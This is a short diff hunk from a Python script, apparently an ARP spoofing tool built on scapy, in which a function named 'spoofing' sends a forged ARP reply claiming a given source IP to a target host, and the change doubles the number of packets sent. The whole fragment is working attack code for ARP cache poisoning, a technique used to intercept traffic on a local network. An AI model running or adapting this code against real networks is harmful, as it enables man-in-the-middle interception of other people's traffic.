@@ -446,7 +446,7 @@ def spoofing(ipt, ips, macc):
     #mact = getm(ipt)
     #print(mact)
     spacket = sc.ARP(op=2,pdst=ipt,psrc=ips,hwdst=macc)
-    sc.send(spacket,count=1,verbose=False)
+    sc.send(spacket,count=2,verbose=False)
 
 def invalid():
     lines()
